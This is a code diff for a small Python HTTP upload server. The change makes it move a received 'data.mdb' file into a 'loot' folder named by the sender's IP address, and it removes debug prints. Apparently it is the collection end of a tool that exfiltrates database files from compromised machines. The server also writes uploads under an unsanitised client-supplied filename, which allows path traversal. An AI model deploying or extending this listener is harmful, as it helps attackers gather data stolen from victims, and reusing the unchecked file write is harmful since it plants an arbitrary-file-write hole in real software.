@@ -3,7 +3,7 @@ import http.server
 import socketserver
 import io
 import cgi
-import threading
+import shutil
 
 # Change this to serve on a different port
 PORT = 8090 
@@ -12,7 +12,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):        
         r, info = self.deal_post_data()
-        print(r, info, "by: ", self.client_address)
         f = io.BytesIO()
         if r:
             f.write(b"Success\n")
@@ -34,7 +33,6 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         pdict['CONTENT-LENGTH'] = int(self.headers['Content-Length'])
         if ctype == 'multipart/form-data':
             form = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD':'POST', 'CONTENT_TYPE':self.headers['Content-Type'], })
-            print (type(form))
             try:
                 if isinstance(form["file"], list):
                     for record in form["file"]:
@@ -43,8 +41,9 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     open("./%s"%form["file"].filename, "wb").write(form["file"].file.read())
             except IOError:
                     return (False, "Can't create file to write, do you have permission to write?")
-        # return (True, "Files uploaded")
-        print('[*] Check your working directory for a file named data.mdb.')
+        client_ip = self.client_address[0]
+        print(f'[*] Check the loot directory for a file named {client_ip}.data.mdb.')
+        shutil.move("./data.mdb", f"./loot/{client_ip}.data.mdb")
         exit()
 
 Handler = CustomHTTPRequestHandler
